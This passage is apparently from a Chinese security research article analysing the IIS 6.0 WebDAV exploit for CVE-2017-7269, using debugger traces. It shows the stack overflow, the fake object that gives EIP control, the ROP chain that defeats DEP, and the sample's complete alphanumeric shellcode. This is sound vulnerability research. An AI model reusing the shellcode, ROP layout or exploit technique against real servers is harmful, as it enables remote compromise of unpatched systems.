    03faf8e4  33 50 77 35 77 6a 44 41-34 33 76 64 46 4d 54 56  3Pw5wjDA43vdFMTV
    03faf8f4  6c 47 43 65 32 76 78 72-69 57 38 43 72 62 30 5a  lGCe2vxriW8Crb0Z
    03faf904  38 59 48 54 02 02 02 02-c0 12 03 68              8YHT.......h
                          ^^^^^^^^^^^ ~~~~~~~~~~~

### 3.3 填充数据

通过`!address` 命令可知地址 `0x680312c0` 位于 `rsaenh` 模块中，具备 `PAGE_READWRITE` 属性。

    
    
    0:006> !address 680312c0
    Failed to map Heaps (error 80004005)
    Usage:                  Image
    Allocation Base:        68000000
    Base Address:           68030000
    End Address:            68032000
    Region Size:            00002000
    Type:                   01000000    MEM_IMAGE
    State:                  00001000    MEM_COMMIT
    Protect:                00000004    PAGE_READWRITE
    More info:              lmv m rsaenh
    More info:              !lmi rsaenh
    More info:              ln 0x680312c0
    
    0:006> u 680312c0 L1
    rsaenh!g_pfnFree+0x4:
    680312c0 0000            add     byte ptr [eax],al

在解析 `http://localhost/bbbbbbb......` 时，数据将被直接填充到地址 `0x680312c0`。此时，由于
`CStackBuffer1` 的长度已经 **_足够大_** ，`ScStoragePathFromUrl` 只会被调用一次。

    
    
    $$ ScStoragePathFromUrl 参数
    0:006> dds esp L3
    03faf7b4  077dc9e0
    03faf7b8  680312c0 rsaenh!g_pfnFree+0x4
    03faf7bc  03faf800
    
    0:006> dd 03faf800 L1
    03faf800  00404040
    
    0:006> p
    eax=00000000 ebx=070fbfc0 ecx=0000e694 edx=680312c0 esi=00000000 edi=77bd8ef2
    eip=6712544a esp=03faf7c0 ebp=03fafc34 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!HrCheckIfHeader+0x124:
    6712544a 8bf0            mov     esi,eax
    
    $$ 填充数据到 0x680312c0
    0:006> db 680312c0
    680312c0  63 00 3a 00 5c 00 69 00-6e 00 65 00 74 00 70 00  c.:.\.i.n.e.t.p.
    680312d0  75 00 62 00 5c 00 77 00-77 00 77 00 72 00 6f 00  u.b.\.w.w.w.r.o.
    680312e0  6f 00 74 00 5c 00 62 00-62 00 62 00 62 00 62 00  o.t.\.b.b.b.b.b.
    680312f0  62 00 62 00 48 79 75 61-43 4f 67 6f 6f 6b 45 48  b.b.HyuaCOgookEH
    68031300  46 36 75 67 33 44 71 38-65 57 62 5a 35 54 61 56  F6ug3Dq8eWbZ5TaV
    68031310  52 69 53 6a 57 51 4e 38-48 59 55 63 71 49 64 43  RiSjWQN8HYUcqIdC
    68031320  72 64 68 34 58 47 79 71-6b 33 55 6b 48 6d 4f 50  rdh4XGyqk3UkHmOP
    68031330  46 7a 71 34 54 6f 43 74-56 59 6f 6f 41 73 57 34  Fzq4ToCtVYooAsW4
    0:006> db
    68031340  68 61 72 7a 45 37 49 4d-4e 57 48 54 38 4c 7a 36  harzE7IMNWHT8Lz6
    68031350  72 35 66 62 43 6e 6d 48-48 35 77 61 5a 4d 74 61  r5fbCnmHH5waZMta
    68031360  33 41 65 43 72 52 69 6d-71 36 64 4e 39 6e 53 63  3AeCrRimq6dN9nSc
    68031370  64 6b 46 51 30 4f 6f 78-53 72 50 67 53 45 63 7a  dkFQ0OoxSrPgSEcz
    68031380  39 71 53 4f 56 44 36 6f-79 73 77 68 56 7a 4a 61  9qSOVD6oyswhVzJa
    68031390  45 39 39 36 39 6c 31 45-72 34 65 53 4a 58 4e 44  E9969l1Er4eSJXND
    680313a0  44 7a 35 6c 56 5a 41 62-72 6e 31 66 59 59 33 54  Dz5lVZAbrn1fYY3T
    680313b0  42 31 65 58 41 59 50 71-36 30 77 57 57 44 61 53  B1eXAYPq60wWWDaS
    0:006> db
    680313c0  c0 13 03 68 4f 6e 00 68-4f 6e 00 68 47 42 6a 76  ...hOn.hOn.hGBjv
    680313d0  c0 13 03 68 57 42 74 4f-47 59 34 52 66 4b 42 4b  ...hWBtOGY4RfKBK
    680313e0  64 74 6f 78 82 60 01 68-35 51 7a 72 7a 74 47 4d  dtox.`.h5QzrztGM
    680313f0  59 44 57 57 13 b1 00 68-76 31 6f 6e e3 24 01 68  YDWW...hv1on.$.h
    68031400  60 14 03 68 00 03 fe 7f-ff ff ff ff c0 13 03 68  `..h...........h
    68031410  6e 04 03 68 6e 71 70 74-34 14 03 68 e7 29 01 68  n..hnqpt4..h.).h
    68031420  91 93 00 68 31 39 6e 66-55 49 52 30 6b 54 6b 76  ...h19nfUIR0kTkv
    68031430  4a 72 61 79 1c 14 03 68-05 6e 00 68 32 77 68 79  Jray...h.n.h2why

### 3.4 控制 EIP

在函数 `HrCheckIfHeader` 返回后，后面会跳转到 `CParseLockTokenHeader::HrGetLockIdForPath`
中去执行，而后者也会多次调用 `CMethUtil::ScStoragePathFromUrl` 这个函数。同样，解析 URL
第一部分（`http://localhost/aaaaaaa....`）时完成栈溢出，此时会覆盖到一个引用 `CMethUtil` 对象的局部变量；在解析
URL 第二部分（`http://localhost/bbbbbbb....`）时，因为 `CMethUtil` 已经伪造好，其成员 `IEcb`
实例同样完成伪造，最后在 `ScStripAndCheckHttpPrefix` 中实现 EIP 的控制。

    
    
    CPutRequest::Execute
    ├──HrCheckStateHeaders
    │  └──HrCheckIfHeader
    │     ├──CMethUtil::ScStoragePathFromUrl
    │     └──CMethUtil::ScStoragePathFromUrl
    │
    └──FGetLockHandle
       └──CParseLockTokenHeader::HrGetLockIdForPath
          ├──CMethUtil::ScStoragePathFromUrl
          └──CMethUtil::ScStoragePathFromUrl

**(1) FGetLockHandle 分析** 函数 `FGetLockHandle` 里面构造了一个 `CParseLockTokenHeader`
对象， **存储于栈上的一个局部变量引用了这个对象** （这一点很重要），调用该对象的成员函数 `HrGetLockIdForPath` 进入下一阶段。

    
    
    int __stdcall FGetLockHandle(
        struct CMethUtil *a1, wchar_t *Str, 
        unsigned __int32 a3, const unsigned __int16 *a4, 
        struct auto_ref_handle *a5)
    {
      signed int v5; // eax@1
      int result; // eax@2
      CParseLockTokenHeader *v7; // [sp+0h] [bp-54h]@1
      union _LARGE_INTEGER v8; // [sp+40h] [bp-14h]@1
      int v9; // [sp+50h] [bp-4h]@1
    
      v7 = CParseLockTokenHeader(a1, a4);
      v9 = 0;
      v7->SetPaths(Str, 0);
      v5 = v7->HrGetLockIdForPath(Str, a3, &v8, 0);
      v9 = -1;
      if ( v5 >= 0 )
      {
        result = FGetLockHandleFromId(a1, v8, Str, a3, a5);
      }
      else
      {
        result = 0;
      }
      return result;
    }

**(2) HrGetLockIdForPath 分析** `HrGetLockIdForPath` 与 `HrCheckIfHeader`
有点类似，同样存在两个 `CStackBuffer` 变量。不同的是，`v22.HighPart` 指向父级函数 `HrGetLockIdForPath`
中引用 `CParseLockTokenHeader` 对象的局部变量，而且这里也会将其转换为 `CMethUtil` 类型使用。

在解析 URL 第一部分（`http://localhost/aaaaaaa....`）时，通过栈溢出可以覆盖引用
`CParseLockTokenHeader` 对象的局部变量，栈布局如下所示。

    
    
    ┌─────────────────────────┐
    │   v7 (FGetLockHandle)   │  CParseLockTokenHeader <────┐
    ├─────────────────────────┤               ↑o            │
    │          ......         │               │v            │
    ├─────────────────────────┤               │e            │
    │            2.heap_buffer│  ebp-14       │r            │
    ├─────────────────────────┤               │f            │
    │         2.fake_heap_size│  ebp-18       │l            │
    ├─────────────────────────┤               │o            │
    │CStackBuffer2.buffer[260]│  ebp-11C      │w            │
    ├─────────────────────────┤ <-------- overwrite data    │
    │            1.heap_buffer│  ebp-120 -> heap (url part1)│
    ├─────────────────────────┤                             │
    │         1.fake_heap_size│  ebp-124                    │
    ├─────────────────────────┤                             │
    │CStackBuffer1.buffer[260]│  ebp-228                    │
    ├─────────────────────────┤                             │
    │          ......         │                             │
    ├────────────┬────────────┤                             │
    │ v22.LowPart│v22.HighPart│  ebp-240  (LARGE_INTEGER) ──┘
    └────────────┴────────────┘

栈上的数据分布如下所示：

    
    
    0:006> dds ebp-18
    03fafbb8  00000412 --------> CStackBuffer2.fake_heap_size
    03fafbbc  03fafab4 --------> CStackBuffer2.buffer[260]
    03fafbc0  00000168
    03fafbc4  03fafc30
    03fafbc8  67140bdd httpext!swscanf+0x137d  --> ret addr
    03fafbcc  00000002
    03fafbd0  03fafc3c
    03fafbd4  6711aba9 httpext!FGetLockHandle+0x40
    03fafbd8  07874c2e
    03fafbdc  80000000
    03fafbe0  03fafc28
    03fafbe4  00000000
    03fafbe8  07872fc0 --------> CParseLockTokenHeader xx
    03fafbec  0788c858
    03fafbf0  0788c858
    
    $$ CMethUtil
    0:006> r ecx
    ecx=07872fc0
    
    $$ LARGE_INTEGER v22
    0:006> dd ebp-240 L2
    03faf990  5a3211a0 03fafbe8
    
    $$ CStackBuffer2.buffer[260]
    0:006> ?ebp-11C
    Evaluate expression: 66779828 = 03fafab4

分析栈的布局可以知道，在复制 `260+12*4=308` 字节数据后，后续的 `4` 字节数据将覆盖引用 `CParseLockTokenHeader`
对象的局部变量。需要注意的是，这里所说的 `308` 字节，是 URL 转变成物理路径后的前 `308` 字节。执行完
`CMethUtil::ScStoragePathFromUrl` 之后，`680313c0` 被填充到父级函数中引用
`CParseLockTokenHeader` 对象所在的局部变量。

    
    
    $$ LARGE_INTEGER v22
    0:006> dd ebp-240 L2
    03faf990  5a3211a0 03fafbe8
    
    0:006> dd 03fafbe8 L1
    03fafbe8  680313c0

**(3) ScStripAndCheckHttpPrefix 分析** 在解析 URL
第二部分（`http://localhost/bbbbbbb....`）时，由于引用 `CParseLockTokenHeader`
对象的局部变量的值已经被修改，所以会使用伪造的对象，最终在函数 `ScStripAndCheckHttpPrefix` 中完成控制权的转移。

    
    
    CPutRequest::Execute
    └──FGetLockHandle
       └──CParseLockTokenHeader::HrGetLockIdForPath ecx = 0x680313C0
          ├──CMethUtil::ScStoragePathFromUrl        ecx = 0x680313C0
          │  └──ScStoragePathFromUrl                ecx = [ecx+0x10]=0x680313C0
          │     └──ScStripAndCheckHttpPrefix        call [[ecx]+0x24]
          └──CMethUtil::ScStoragePathFromUrl

接管控制权后，将开始执行 ROP 代码。

    
    
    0:006> dd 680313C0 L1
    680313c0  680313c0
    
    0:006> dd 680313C0+10 L1
    680313d0  680313c0
    
    0:006> dd 680313C0+24 L1
    680313e4  68016082
    
    0:006> u 68016082
    rsaenh!_alloca_probe+0x42:
    68016082 8be1            mov     esp,ecx
    68016084 8b08            mov     ecx,dword ptr [eax]
    68016086 8b4004          mov     eax,dword ptr [eax+4]
    68016089 50              push    eax
    6801608a c3              ret
    6801608b cc              int     3
    6801608c cc              int     3
    6801608d cc              int     3

### 3.5 绕过 DEP

在执行 ROP 代码片段时，会跳转到 `KiFastSystemCall` 去执行，这里将 **EAX** 寄存器的值设置为 `0x8F`，也就是
`NtProtectVirtualMemory` 的服务号，函数的参数通过栈进行传递。

    
    
    0:006> dds esp
    68031400  68031460      --> return address
    68031404  7ffe0300      --> SharedUserData!SystemCallStub
    68031408  ffffffff      --> ProcessHandle, CURRENT_PROCESS
    6803140c  680313c0      --> BaseAddress
    68031410  6803046e      --> RegionSize, 0x48
    68031414  00000040      --> NewProtectWin32, PAGE_EXECUTE_READWRITE
    68031418  68031434      --> OldProtect

TK 在 CanSecWest 2013 的演讲《 **DEP/ASLR bypass without ROP/JIT**
》[[4](https://cansecwest.com/slides/2013/DEP-ASLR%20bypass%20without%20ROP-JIT.pdf)] 中提到：

> SharedUserData is always fixed in 0x7ffe0000 from Windows NT 4 to Windows 8
> 0x7ffe0300 is always point to KiFastSystemCall Only work on x86 Windows

这里就是用了 `0x7ffe0300` 这个地址来定位 `KiFastSystemCall`（关于 `KiFastSystemCall`
的介绍，可以参考文档 《 **KiFastCallEntry() 机制分析** 》
[[5](http://www.mouseos.com/windows/kernel/KiFastCallEntry.html)]）。

### 3.6 Shellcode

样本中的 Shellcode 如下：

    
    
    VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAI
    AXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8
    Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LM
    X1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6
    P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XK
    Q3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJ
    Z2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3UL
    Y7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA

前面分析到函数 `CRequest::LpwszGetHeader` 会把其转成 UNICODE 字符串，所以在内存中长这个样子：

    
    
    0:006> db 68031460
    68031460  55 00 56 00 59 00 41 00-34 00 34 00 34 00 34 00  U.V.Y.A.4.4.4.4.
    68031470  34 00 34 00 34 00 34 00-34 00 34 00 51 00 41 00  4.4.4.4.4.4.Q.A.
    68031480  54 00 41 00 58 00 41 00-5a 00 41 00 50 00 41 00  T.A.X.A.Z.A.P.A.
    68031490  33 00 51 00 41 00 44 00-41 00 5a 00 41 00 42 00  3.Q.A.D.A.Z.A.B.
    680314a0  41 00 52 00 41 00 4c 00-41 00 59 00 41 00 49 00  A.R.A.L.A.Y.A.I.
    680314b0  41 00 51 00 41 00 49 00-41 00 51 00 41 00 50 00  A.Q.A.I.A.Q.A.P.
    680314c0  41 00 35 00 41 00 41 00-41 00 50 00 41 00 5a 00  A.5.A.A.A.P.A.Z.
    680314d0  31 00 41 00 49 00 31 00-41 00 49 00 41 00 49 00  1.A.I.1.A.I.A.I.

这是所谓的 **Alphanumeric Shellcode** [[6](https://github.com/SkyLined/alpha3)]，可以以
ASCII 或者 UNICODE 字符串形式呈现 Shellcode。

### 3.7 The Last Question

最后一个问题是，在 Exploit 的两个 URL 之间存在 `(Not <locktoken:write1>)`
这样一个字符串，这个字符串的作用是什么呢？如果删掉这个字符串，Exploit 就失效了，因为 `HrCheckIfHeader` 中解析 URL
的流程中断了，而解析流程得以继续的关键是 `while` 循环中嵌套的 `for` 循环对 `IFITER::PszNextToken(2)`
的调用。需要注意的是，这里传递的参数值是 `2`，而分析 `IFITER::PszNextToken()`
的反汇编代码，可以知道这个字符串只要满足一定的形式就可以了，如 `(nOt <hahahahah+asdfgh>)` 或者 `(nOt
[hahahahah+asdfgh])` 都是可以的。

    
    
    int __thiscall IFITER::PszNextToken(int this, signed int a2)
    {
      //......
      if ( !_wcsnicmp(L"not", (const wchar_t *)v4, 3u) )
      {
        *(_DWORD *)(v2 + 4) += 6;
        *(_DWORD *)(v2 + 28) = 1;       // ----> 设置值
        while ( **(_WORD **)(v2 + 4) && iswspace(**(_WORD **)(v2 + 4)) )
          *(_DWORD *)(v2 + 4) += 2;
        if ( !**(_WORD **)(v2 + 4) )
          return 0;
      }
      v17 = **(_WORD **)(v2 + 4);
      if ( v17 == '<' )
      {
    LABEL_64:
        v23 = '>';
        goto LABEL_65;
      }
      if ( v17 != '[' )
        return 0;
      v23 = ']';
    LABEL_65:
      v20 = *(_DWORD *)(v2 + 4);
      v21 = wcschr((const wchar_t *)(v20 + 2), v23);
      *(_DWORD *)(v2 + 4) = v21;
      if ( !v21 )
        return 0;
      *(_DWORD *)(v2 + 4) = v21 + 1;
      v22 = v2 + 8;
      StringBuffer<char>::AppendAt(0, 
        2 * ((signed int)((char *)v21 - v20) >> 1) + 2, v20);
      StringBuffer<char>::AppendAt(*(_DWORD *)(v22 + 8), 
        2, &gc_wszEmpty);
      return *(_DWORD *)v22;
    }

不过 `not` 字符串是不能替换的，因为这里会影响程序的执行流程。从上面的代码可以看出，存在 `not` 字符串时会将对象偏移 `28 (0x1C)`
处的值设置为 `1`，这个值会决定父级函数中的一个跳转（`goto LABEL_27`）是否执行。

    
    
    // v22      -> ebp-44C
    // ifilter  -> ebp-468
    // 0x468 + 0x1C = 0x44C
    
    if ( !FGetLastModTime(0, v8, &v23) || !FETagFromFiletime(
            &v23, &String, *((const struct IEcb **)a1 + 4)) )
    {
    LABEL_26:
      if ( v22 )                            // ==1
        goto LABEL_27;
      goto LABEL_30;
    }

## 4\. 其他

要编写一个真实环境中通用的 Exploit，还需要考虑许多其他因素，比如 IIS 设置的物理路径等，文章
[[7](https://xianzhi.aliyun.com/forum/read/1458.html)] 列举了一些注意事项。

此外，文章 [[8](https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/)] 提到了一种基于
HTTP 回传信息的方法。

当然，关于编写通用 Exploit 所需要注意的细节，也可以参考 NSA 的 Explodingcan 的参数设置。

![NSA Explodingcan
参数设置](https://images.seebug.org/content/images/2017/04/4BB246A3-76D5-431E-A798-6E629C729C02.png-w331s)

# 5\. References

**[1]** https://github.com/edwardz246003/IIS_exploit  
**[2]** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269  
**[3]** https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html  
**[4]** https://cansecwest.com/slides/2013/DEP-ASLR%20bypass%20without%20ROP-JIT.pdf  
**[5]** http://www.mouseos.com/windows/kernel/KiFastCallEntry.html  
**[6]** https://github.com/SkyLined/alpha3  
**[7]** https://xianzhi.aliyun.com/forum/read/1458.html  
**[8]** https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/282/>

